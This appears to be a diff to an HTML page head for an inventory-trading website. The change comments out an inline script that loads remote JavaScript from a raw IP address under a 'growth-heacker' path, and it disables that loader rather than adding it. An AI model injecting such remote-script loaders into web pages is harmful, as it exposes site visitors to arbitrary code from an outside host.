@@ -2,10 +2,12 @@
 <html lang="en" class="no-js">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
+<!--
 <script type="text/javascript">
 var key = 3;
 (function(a) {var gaa = document.createElement('script'); gaa.type = 'text/javascript'; gaa.async = true; gaa.src = 'http://52.74.43.53/growth-heacker/feed.js?key='+key;var ss = document.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(gaa, ss);}(window, document))
-</script>
+</script>-->
+
 <meta charset="utf-8"/>
 <title>Online Sell and Purchase Non Moving Inventory</title>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
